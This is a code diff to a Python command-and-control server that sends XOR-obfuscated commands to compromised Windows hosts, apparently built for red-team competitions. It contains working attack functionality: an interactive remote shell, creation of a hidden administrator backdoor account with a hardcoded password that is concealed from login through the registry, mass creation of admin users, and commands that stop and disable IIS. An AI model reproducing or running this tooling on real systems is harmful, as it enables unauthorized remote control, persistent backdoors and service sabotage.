@@ -13,14 +13,18 @@ def xor_crypt(data: bytes, key: str) -> bytes:
     key_bytes = key.encode("utf-8")
     return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
 
-def send_command(conn, command):
+def send_command(ip, command):
+    """Always fetches the current live socket for this IP before sending."""
     try:
-        # Encode outgoing command before sending
+        with sessions_lock:
+            if ip not in sessions:
+                return "[!] No active session for this IP"
+            conn = sessions[ip]["conn"]
+
         encoded = xor_crypt(command.encode("utf-8"), XOR_KEY)
         conn.send(encoded)
         time.sleep(3)
 
-        # Receive and decode incoming response
         response = b""
         conn.settimeout(5)
         try:
@@ -120,7 +124,7 @@ def get_name_queue(team):
     random.shuffle(pool)
     return pool
 
-def flood_users(conn, team, count, delay=0):
+def flood_users(ip, team, count, delay=0):
     queue = get_name_queue(team)
     used = []
     created = 0
@@ -133,7 +137,7 @@ def flood_users(conn, team, count, delay=0):
         used.append(username)
         cmd = make_user_command(username, admin=True)
         print(f"[+] Creating ({created + 1}/{count}): {username}")
-        result = send_command(conn, cmd)
+        result = send_command(ip, cmd)
         if result.strip():
             print(result)
         created += 1
@@ -142,7 +146,7 @@ def flood_users(conn, team, count, delay=0):
             time.sleep(delay)
     print(f"\n[+] Done. {count} users created.")
 
-def create_hidden_user(conn):
+def create_hidden_user(ip):
     username = "svc_diag"
     password = "Diag$2024!"
     cmd_create = (
@@ -157,12 +161,12 @@ def create_hidden_user(conn):
         f'-Name "{username}" -Value 0 -PropertyType DWord -Force'
     )
     print(f"\n[*] Creating hidden user: {username}")
-    print(send_command(conn, cmd_create))
-    print(send_command(conn, cmd_admin))
-    print(send_command(conn, cmd_hide))
+    print(send_command(ip, cmd_create))
+    print(send_command(ip, cmd_admin))
+    print(send_command(ip, cmd_hide))
     print(f"[+] Hidden user '{username}' created | password: {password}")
 
-def user_flood_menu(conn, team):
+def user_flood_menu(ip, team):
     while True:
         print(f"\n--- User Flood Menu [{team}] ---")
         print("  [1] Drop 10 users instantly")
@@ -173,18 +177,18 @@ def user_flood_menu(conn, team):
         if choice == "0":
             break
         elif choice == "1":
-            flood_users(conn, team, count=10, delay=0)
+            flood_users(ip, team, count=10, delay=0)
         elif choice == "2":
             threading.Thread(
                 target=flood_users,
-                args=(conn, team, 5, 300),
+                args=(ip, team, 5, 300),
                 daemon=True
             ).start()
             print("[*] Slow drip running in background.")
         elif choice == "3":
-            create_hidden_user(conn)
+            create_hidden_user(ip)
 
-def automation_menu(conn, team):
+def automation_menu(ip, team):
     automations = {
         "1": ("Disable IIS",       "Stop-Service -Name W3SVC; Set-Service -Name W3SVC -StartupType Disabled"),
         "2": ("Check IIS status",  "Get-Service -Name W3SVC | Select-Object Status"),
@@ -201,20 +205,20 @@ def automation_menu(conn, team):
         if choice == "0":
             break
         elif choice == "5":
-            user_flood_menu(conn, team)
+            user_flood_menu(ip, team)
         elif choice in automations:
             label, cmd = automations[choice]
             print(f"\n[*] Running: {label}")
-            print(send_command(conn, cmd))
+            print(send_command(ip, cmd))
 
-def interactive_mode(conn, ip):
+def interactive_mode(ip):
     print(f"[*] Interactive shell on {ip}. Type 'back' to return.\n")
     while True:
         cmd = input(f"{ip}> ").strip()
         if cmd.lower() == "back":
             break
         if cmd:
-            print(send_command(conn, cmd))
+            print(send_command(ip, cmd))
 
 def session_menu(ip):
     with sessions_lock:
@@ -222,9 +226,9 @@ def session_menu(ip):
             print(f"[!] No active session for {ip}")
             return
         session = sessions[ip]
-    conn  = session["conn"]
-    team  = session["team"]
-    port  = session["port"]
+    team = session["team"]
+    port = session["port"]
+
     while True:
         print(f"\n=== Session: {ip} | Team: {team} | Port: {port} ===")
         print("  [1] Interactive shell")
@@ -232,9 +236,9 @@ def session_menu(ip):
         print("  [3] Back to session list")
         choice = input("Select> ").strip()
         if choice == "1":
-            interactive_mode(conn, ip)
+            interactive_mode(ip)
         elif choice == "2":
-            automation_menu(conn, team)
+            automation_menu(ip, team)
         elif choice == "3":
             break
 
